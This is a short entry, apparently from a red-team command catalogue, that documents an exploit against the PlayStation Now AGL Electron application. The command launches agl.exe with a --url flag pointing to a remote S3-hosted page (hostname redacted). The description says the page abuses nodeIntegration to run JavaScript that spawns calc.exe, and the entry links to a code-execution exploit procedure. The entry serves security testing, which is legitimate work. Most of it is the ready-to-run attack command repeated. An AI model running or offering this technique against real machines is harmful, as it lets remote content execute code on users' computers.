---
data: >-
  "C:\Program Files (x86)\PlayStationNow\agl\agl.exe"
  --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html
tags:
  - electron
  - url-loading
type: command
executor: bash
platforms:
  - Windows
id: 9c967638-9c2d-4e97-9c2c-3b446cdc5cf4
created_at: '2025-12-11T03:47:56.461Z'
updated_at: '2025-12-11T03:47:56.461Z'
verified: false
validated: true
submitted: true
---
# agl-exe-url-malicious

## Command

```bash
"C:\Program Files (x86)\PlayStationNow\agl\agl.exe" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html
```

## Description

Launches the AGL Electron application with a specified malicious URL to test nodeIntegration vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | Specifies the URL to load | Yes |

## Examples

### Basic Usage

```bash
"C:\Program Files (x86)\PlayStationNow\agl\agl.exe" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html
```

## Expected Output

AGL loads the URL, executes the JavaScript, and spawns calc.exe.

## Related

- [[procedures/Exploit-NodeIntegration-for-Code-Execution]]
